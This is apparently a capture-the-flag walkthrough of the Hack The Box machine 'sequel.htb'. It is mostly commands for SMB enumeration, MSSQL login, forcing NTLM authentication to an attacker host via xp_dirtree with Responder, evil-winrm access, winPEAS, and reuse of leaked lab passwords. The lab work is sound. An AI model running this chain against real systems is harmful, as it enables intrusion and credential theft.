```
nmap -sS -sC -sV -T5 -Pn 10.10.11.202
dc.sequel.htb
```
![image](https://github.com/user-attachments/assets/9263ebf5-8f7b-407d-baa3-e3a46e8540af)

```
smbclient -L \\\\10.10.11.202\\
smbclient \\\\10.10.11.202\\Public
```
![image](https://github.com/user-attachments/assets/f31422ee-e143-4d2a-bef8-505127c28203)

```
python3 -m http.server 80
http://10.10.14.6/SQL%20Server%20Procedures.pdf
PublicUser | GuestUserCantWrite1
```
![image](https://github.com/user-attachments/assets/dd949602-8c3c-435d-b04e-0dc1ecb8d7ff)

```
./kerbrute_linux_amd64 userenum --dc 10.10.11.202 -d sequel.htb users_0
```
![image](https://github.com/user-attachments/assets/53c9d8de-3ef7-4c76-a88d-b3c09f6caa53)

```
impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202
```
![image](https://github.com/user-attachments/assets/c4f31852-f910-4641-a631-8489f6023ac7)

```
responder -I tun0 -v
EXEC MASTER.sys.xp_dirtree '\\10.10.14.6\test', 1, 1
REGGIE1234ronnie (sql_svc)
```
![image](https://github.com/user-attachments/assets/bb0b8250-4cd0-463a-8fd9-0bd1882b66c2)

![image](https://github.com/user-attachments/assets/eabb3ae2-1343-47d2-8742-7f235c1acd67)

```
crackmapexec winrm 10.10.11.202 -u users_3 -p REGGIE1234ronnie --continue-on-success
evil-winrm -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnie
```
![image](https://github.com/user-attachments/assets/a62a4cdd-c228-493f-8bde-caa93695ebca)

![image](https://github.com/user-attachments/assets/78b2d28d-f869-4b04-8b55-2ec48b8db114)

```
upload winPEASany.exe
./winPEASany.exe
```
![image](https://github.com/user-attachments/assets/170c7e63-ac22-43db-896d-fae7a896190b)

```
type C:\sqlserver\Logs\ERRORLOG.bak
```
![image](https://github.com/user-attachments/assets/53099c6d-e9cb-4d4a-8606-fa52dea217f3)

![image](https://github.com/user-attachments/assets/cd62b77f-eaad-4fbc-9e40-d95f595cb14e)

```
crackmapexec winrm 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3
```
![image](https://github.com/user-attachments/assets/bb11ad81-6b7a-4469-a77a-b9f5db898f5a)

```
evil-winrm -i 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3
```
![image](https://github.com/user-attachments/assets/95b9055c-951e-4a11-855b-ee410f182df7)
